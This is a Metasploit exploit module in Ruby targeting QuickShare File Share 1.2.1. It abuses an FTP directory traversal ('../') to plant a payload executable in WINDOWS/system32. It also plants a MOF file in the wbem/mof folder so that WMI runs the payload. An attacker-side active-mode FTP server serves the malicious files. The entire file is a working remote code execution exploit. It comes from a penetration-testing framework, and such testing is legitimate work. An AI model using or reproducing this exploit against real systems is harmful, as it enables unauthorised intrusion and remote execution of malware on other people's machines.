##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Ftp
	include Msf::Exploit::Remote::TcpServer
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec

	def initialize(info={})
		super(update_info(info,
			'Name'           => "QuickShare File Share 1.2.1 Directory Traversal Vulnerability",
			'Description'    => %q{
					This module exploits a vulnerability found in QuickShare File Share's FTP
				service.  By supplying "../" in the file path, it is possible to trigger a
				directory traversal flaw, allowing the attacker to read a file outside the
				virtual directory.  By default, the "Writable" option is enabled during account
				creation, therefore this makes it possible to create a file at an arbitrary
				location, which leads to remote code execution.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'modpr0be', #Discovery, PoC
					'sinn3r'    #Metasploit
				],
			'References'     =>
				[
					['OSVDB', '70776'],
					['EDB', '16105'],
					['URL', 'http://www.quicksharehq.com/blog/quickshare-file-server-1-2-2-released.html'],
					['URL', 'http://www.digital-echidna.org/2011/02/quickshare-file-share-1-2-1-directory-traversal-vulnerability/']
				],
			'Payload'        =>
				{
					'BadChars' => "\x00"
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "none"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['QuickShare File Share 1.2.1', {}]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Feb 03 2011",
			'DefaultTarget'  => 0))

		register_options(
			[
				# Change the default description so this option makes sense
				OptPort.new('SRVPORT', [true, 'The local port to listen on for active mode', 8080])
			], self.class)
	end


	def check
		connect
		disconnect

		if banner =~ /quickshare ftpd/
			return Exploit::CheckCode::Detected
		else
			return Exploit::CheckCode::Safe
		end
	end


	def on_client_connect(cli)
		peer = "#{cli.peerhost}:#{cli.peerport}"

		case @stage
		when :exe
			print_status("#{peer} - Sending executable (#{@exe.length.to_s} bytes)")
			cli.put(@exe)
			@stage = :mof

		when :mof
			print_status("#{peer} - Sending MOF (#{@mof.length.to_s} bytes)")
			cli.put(@mof)
		end

		cli.close
	end


	def upload(filename)
		select(nil, nil, nil, 1)

		peer = "#{rhost}:#{rport}"
		print_status("#{peer} - Trying to upload #{::File.basename(filename)}")

		# We can't use connect_login, because it cannot determine a successful login correctly.
		# For example: The server actually returns a 503 (Bad Sequence of Commands) when the
		# user has already authenticated.
		conn = connect(false, datastore['VERBOSE'])

		res = send_user(datastore['FTPUSER'], conn)

		if res !~ /^(331|2)/
			vprint_error("#{peer} - The server rejected our username: #{res.to_s}")
			return false
		end

		res = send_pass(datastore['FTPPASS'], conn)
		if res !~ /^(2|503)/
			vprint_error("#{peer} - The server rejected our password: #{res.to_s}")
			return false
		end

		# Switch to binary mode
		print_status("#{peer} - Set binary mode")
		send_cmd(['TYPE', 'I'], true, conn)

		# Prepare active mode: Get attacker's IP and source port
		src_ip   = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address("50.50.50.50") : datastore['SRVHOST']
		src_port = datastore['SRVPORT'].to_i

		# Prepare active mode: Convert the IP and port for active mode
		src_ip   = src_ip.gsub(/\./, ',')
		src_port = "#{src_port/256},#{src_port.remainder(256)}"

		# Set to active mode
		print_status("#{peer} - Set active mode \"#{src_ip},#{src_port}\"")
		send_cmd(['PORT', "#{src_ip},#{src_port}"], true, conn)

		# Tell the FTP server to download our file
		send_cmd(['STOR', filename], false, conn)

		disconnect(conn)
	end


	def exploit
		trigger  = '../../../../../../../../'
		exe_name = "#{trigger}WINDOWS/system32/#{rand_text_alpha(rand(10)+5)}.exe"
		mof_name = "#{trigger}WINDOWS/system32/wbem/mof/#{rand_text_alpha(rand(10)+5)}.vbs"
		@mof      = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))
		@exe      = generate_payload_exe
		@stage = :exe

		begin
			t = framework.threads.spawn("reqs", false) {
				# Upload our malicious executable
				u = upload(exe_name)

				# Upload the mof file
				upload(mof_name) if u
			}
			super
		ensure
			t.kill
		end
	end

end
